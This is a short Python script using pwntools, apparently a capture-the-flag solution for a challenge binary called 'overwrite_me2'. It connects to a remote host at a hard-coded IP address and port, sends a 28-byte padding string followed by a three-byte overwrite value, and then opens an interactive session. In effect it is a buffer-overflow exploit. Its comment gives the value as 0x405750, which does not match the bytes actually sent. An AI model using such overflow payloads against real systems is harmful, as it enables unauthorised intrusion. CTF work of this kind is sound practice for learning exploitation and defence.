from pwn import *

def conn():
    #r = process("./overwrite_me2")
    #gdb.attach(r)

    r = remote("13.48.160.64", 1002)

    return r


def main():
    r = conn()

    buffer = "AAAABBBBCCCCDDDDEEEEFFFFGGGG" # 28 bytes
    value = "\x50\x57\x4e" # 0x405750
    payload = buffer + value

    r.recvuntil(b"your payload:")
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()